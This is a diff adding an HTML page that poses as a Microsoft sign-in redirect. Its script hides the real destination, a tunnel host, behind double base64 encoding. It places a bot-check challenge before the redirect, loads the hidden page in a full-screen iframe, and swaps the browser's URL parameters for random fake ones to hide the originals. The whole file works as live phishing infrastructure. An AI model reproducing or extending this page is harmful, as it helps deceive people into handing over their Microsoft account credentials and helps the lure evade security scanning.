@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Sign-in Redirect</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Lottie Player -->
+    <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
+    <!-- Spline Viewer (for 3D elements) -->
+    <script type="module" src="https://unpkg.com/@splinetool/viewer@0.9.414/build/spline-viewer.js"></script>
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'ms-blue': '#0078d4',
+                        'ms-dark-blue': '#106ebe',
+                        'ms-light-blue': '#cce3f5',
+                        'ms-gray': '#605e5c',
+                        'ms-light-gray': '#f5f5f5'
+                    },
+                    animation: {
+                        'fade-in': 'fadeIn 0.5s ease-in-out forwards',
+                        'fade-out': 'fadeOut 0.5s ease-in-out forwards',
+                        'slide-up': 'slideUp 0.6s ease-out forwards',
+                        'float': 'float 3s ease-in-out infinite'
+                    },
+                    keyframes: {
+                        fadeIn: {
+                            '0%': { opacity: '0' },
+                            '100%': { opacity: '1' }
+                        },
+                        fadeOut: {
+                            '0%': { opacity: '1' },
+                            '100%': { opacity: '0' }
+                        },
+                        slideUp: {
+                            '0%': { transform: 'translateY(20px)', opacity: '0' },
+                            '100%': { transform: 'translateY(0)', opacity: '1' }
+                        },
+                        float: {
+                            '0%, 100%': { transform: 'translateY(0)' },
+                            '50%': { transform: 'translateY(-10px)' }
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <style type="text/tailwindcss">
+        @layer components {
+            .glass-card {
+                @apply bg-white bg-opacity-90 backdrop-blur-lg;
+            }
+            
+            .progress-bar {
+                @apply h-1 w-full overflow-hidden bg-ms-light-blue relative;
+            }
+            
+            .progress-bar::after {
+                content: '';
+                @apply absolute top-0 left-0 h-full bg-ms-blue transition-all duration-500 ease-out;
+                animation: progress 2s ease-out infinite;
+            }
+            
+            @keyframes progress {
+                0% { width: 0%; left: 0%; }
+                50% { width: 30%; left: 35%; }
+                100% { width: 0%; left: 100%; }
+            }
+            
+            .cancelLink {
+                @apply text-ms-blue hover:text-ms-dark-blue hover:underline transition-colors font-medium;
+            }
+            
+            .dot {
+                @apply inline-block h-2 w-2 mx-1 rounded-full bg-ms-blue;
+                animation: dot-pulse 1.4s infinite ease-in-out;
+            }
+            
+            .dot:nth-child(1) {
+                animation-delay: 0s;
+            }
+            
+            .dot:nth-child(2) {
+                animation-delay: 0.2s;
+            }
+            
+            .dot:nth-child(3) {
+                animation-delay: 0.4s;
+            }
+            
+            @keyframes dot-pulse {
+                0%, 60%, 100% { transform: scale(1); opacity: 0.4; }
+                30% { transform: scale(1.5); opacity: 1; }
+            }
+        }
+    </style>
+</head>
+<body class="min-h-screen bg-gradient-to-b from-white to-ms-light-blue flex items-center justify-center p-4">
+    <!-- Background 3D element with Spline -->
+    <div class="fixed w-full h-full top-0 left-0 -z-10 opacity-40">
+        <spline-viewer url="https://prod.spline.design/mAXoIkgd8xZRsO2j/scene.splinecode"></spline-viewer>
+    </div>
+    
+    <!-- Main container -->
+    <div id="mainContainer" class="w-full max-w-md animate-slide-up">
+        <!-- Card with glass effect -->
+        <div class="glass-card rounded-xl shadow-xl overflow-hidden border border-white border-opacity-30">
+            <!-- Progress bar -->
+            <div class="progress-bar"></div>
+            
+            <!-- Content -->
+            <div class="p-8 flex flex-col items-center">
+                <!-- Microsoft logo -->
+                <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" 
+                     alt="Microsoft" 
+                     class="h-6 mb-8">
+                
+                <!-- Main animation using Lottie -->
+                <div class="w-32 h-32 mb-6">
+                    <lottie-player
+                        src="https://assets5.lottiefiles.com/packages/lf20_zw0djhar.json"
+                        background="transparent"
+                        speed="1"
+                        loop
+                        autoplay>
+                    </lottie-player>
+                </div>
+                
+                <!-- Text content -->
+                <div class="text-center mb-8">
+                    <h1 class="text-2xl font-semibold text-gray-900 mb-1">Taking you</h1>
+                    <p class="text-gray-600">to your organization's sign-in page</p>
+                </div>
+                
+                <!-- Loading dots -->
+                <div class="flex items-center justify-center mb-10">
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
+                
+                <!-- Turnstile verification (always visible) -->
+                <div id="verificationContainer" class="w-full mb-6">
+                    <div class="text-center mb-4">
+                        <p class="text-sm text-gray-600">Please complete the security check</p>
+                    </div>
+                    <div id="turnstileContainer" class="flex justify-center"></div>
+                </div>
+                
+                <!-- Cancel link -->
+                <a href="javascript:void(0)" class="cancelLink" id="cancelButton">Cancel</a>
+            </div>
+        </div>
+        
+        <!-- Status messages -->
+        <div class="mt-4 text-center">
+            <p id="statusMessage" class="text-sm text-ms-gray hidden animate-fade-in">
+                Verifying your identity...
+            </p>
+        </div>
+    </div>
+    
+    <!-- Hidden redirect iframe -->
+    <iframe id="redirectFrame" class="fixed top-0 left-0 w-full h-full border-0 opacity-0 -z-10 transition-opacity duration-500" 
+            title="Organization sign-in page"></iframe>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elements
+            const elements = {
+                mainContainer: document.getElementById('mainContainer'),
+                verificationContainer: document.getElementById('verificationContainer'),
+                turnstileContainer: document.getElementById('turnstileContainer'),
+                statusMessage: document.getElementById('statusMessage'),
+                redirectFrame: document.getElementById('redirectFrame'),
+                cancelButton: document.getElementById('cancelButton')
+            };
+            
+            // Configuration
+            const config = {
+                turnstileSiteKey: '0x4AAAAAAA5PeFzxadFDHL70',
+                redirectDelay: 1000, // Faster redirect
+                verificationNeeded: true // Always require verification
+            };
+            
+            // Handle cancel
+            elements.cancelButton.addEventListener('click', function() {
+                if (!window.close()) {
+                    window.location.href = 'https://www.microsoft.com';
+                }
+            });
+            
+            // Function to change URL parameters
+            function changeUrlParameters() {
+                try {
+                    // Generate fake parameters
+                    const fakeParams = {
+                        session: generateRandomString(12),
+                        target: 'portal',
+                        client: generateRandomString(8),
+                        auth: 'standard',
+                        device: generateRandomString(10),
+                        origin: 'direct'
+                    };
+                    
+                    // Create new URL without hash/fragment
+                    let newUrl = window.location.origin + window.location.pathname;
+                    
+                    // Add fake query parameters
+                    const params = new URLSearchParams();
+                    for (const [key, value] of Object.entries(fakeParams)) {
+                        params.append(key, value);
+                    }
+                    
+                    newUrl += '?' + params.toString();
+                    
+                    // Replace current URL without reloading the page
+                    window.history.replaceState({}, document.title, newUrl);
+                } catch (e) {
+                    console.error('Error updating URL parameters', e);
+                }
+            }
+            
+            // Generate random string for parameters
+            function generateRandomString(length) {
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                let result = '';
+                for (let i = 0; i < length; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+            
+            // URL handler functions
+            const urlHandler = {
+                decodeURL(encodedUrl) {
+                    try {
+                        const decodedOnce = atob(encodedUrl);
+                        const decodedTwice = atob(decodedOnce);
+                        
+                        if (!decodedTwice.startsWith('http')) {
+                            throw new Error('Invalid URL format');
+                        }
+                        return decodedTwice;
+                    } catch (e) {
+                        console.error('Error decoding URL');
+                        return null;
+                    }
+                },
+                
+                hasValidHash() {
+                    return window.location.hash && window.location.hash.length > 1;
+                },
+                
+                sanitizeParams(url) {
+                    try {
+                        const currentParams = new URLSearchParams(window.location.search);
+                        const baseUrl = url.split('?')[0];
+                        const finalUrl = new URL(baseUrl);
+                        
+                        currentParams.forEach((value, key) => {
+                            if (value && value.length > 0) {
+                                finalUrl.searchParams.append(key, value);
+                            }
+                        });
+                        
+                        if (this.hasValidHash()) {
+                            return finalUrl.toString() + window.location.hash;
+                        }
+                        
+                        return finalUrl.toString();
+                    } catch (e) {
+                        console.error('Error processing URL parameters');
+                        return url;
+                    }
+                },
+                
+                getRedirectUrl() {
+                    // Example encoded URL - in production, this would be properly encoded
+                    const encodedUrl = 'YUhSMGNITTZMeTl3YjNKMGRXZDFaWE5sTFc5amRHOWlaWEl0Y205MVoyaHNlUzEwY25Wc2VTNTBjbmxqYkc5MVpHWnNZWEpsTG1OdmJRPT0=';
+                    const decodedURL = this.decodeURL(encodedUrl);
+                    
+                    if (!decodedURL) {
+                        throw new Error('Invalid redirect URL');
+                    }
+                    
+                    return this.sanitizeParams(decodedURL);
+                }
+            };
+            
+            // Animation and UI functions
+            const ui = {
+                showElement(element) {
+                    element.classList.remove('hidden');
+                    // Force reflow
+                    void element.offsetWidth;
+                    element.classList.add('animate-fade-in');
+                },
+                
+                hideElement(element) {
+                    element.classList.remove('animate-fade-in');
+                    element.classList.add('animate-fade-out');
+                    setTimeout(() => {
+                        element.classList.add('hidden');
+                        element.classList.remove('animate-fade-out');
+                    }, 500);
+                },
+                
+                updateStatus(message) {
+                    elements.statusMessage.textContent = message;
+                    if (elements.statusMessage.classList.contains('hidden')) {
+                        this.showElement(elements.statusMessage);
+                    }
+                },
+                
+                redirect(url) {
+                    ui.updateStatus('Redirecting to your organization...');
+                    
+                    // Set iframe source
+                    elements.redirectFrame.src = url;
+                    elements.redirectFrame.style.display = 'block';
+                    
+                    // When iframe loads, fade it in and main content out
+                    elements.redirectFrame.onload = function() {
+                        elements.redirectFrame.style.opacity = '1';
+                        elements.redirectFrame.style.zIndex = '100';
+                        
+                        // Change URL parameters to hide original parameters
+                        changeUrlParameters();
+                        
+                        // Fade out main container
+                        elements.mainContainer.classList.add('animate-fade-out');
+                        setTimeout(() => {
+                            elements.mainContainer.style.display = 'none';
+                        }, 500);
+                    };
+                }
+            };
+            
+            // Verification function
+            function initVerification() {
+                // Verification container is always visible, no need to show it
+                ui.updateStatus('Please complete the security check');
+                
+                // Load Turnstile
+                if (window.turnstile) {
+                    window.turnstile.render('#turnstileContainer', {
+                        sitekey: config.turnstileSiteKey,
+                        theme: 'light',
+                        callback: function(token) {
+                            if (token) {
+                                onVerificationComplete();
+                            }
+                        }
+                    });
+                } else {
+                    // If Turnstile failed to load, load it manually
+                    const script = document.createElement('script');
+                    script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad';
+                    script.async = true;
+                    document.head.appendChild(script);
+                    
+                    window.onTurnstileLoad = function() {
+                        window.turnstile.render('#turnstileContainer', {
+                            sitekey: config.turnstileSiteKey,
+                            theme: 'light',
+                            callback: function(token) {
+                                if (token) {
+                                    onVerificationComplete();
+                                }
+                            }
+                        });
+                    };
+                }
+            }
+            
+            // Start redirect process
+            function startRedirect() {
+                // Check if hash is valid
+                if (!urlHandler.hasValidHash()) {
+                    ui.updateStatus('Invalid session. Please reload the page.');
+                    return;
+                }
+                
+                // Always initialize verification immediately
+                initVerification();
+            }
+            
+            // Handle verification completion
+            function onVerificationComplete() {
+                // Simply update status without hiding the container
+                elements.verificationContainer.style.opacity = '0.5';
+                ui.updateStatus('Verification successful');
+                
+                setTimeout(() => {
+                    try {
+                        const redirectUrl = urlHandler.getRedirectUrl();
+                        ui.redirect(redirectUrl);
+                    } catch (error) {
+                        ui.updateStatus('Redirect failed. Please try again.');
+                    }
+                }, config.redirectDelay);
+            }
+            
+            // Initialize
+            function init() {
+                // Prevent clickjacking
+                if (window.self !== window.top) {
+                    window.top.location = window.self.location;
+                }
+                
+                // Start the redirect process
+                startRedirect();
+            }
+            
+            // Start everything
+            init();
+        });
+    </script>
+</body>
+</html>
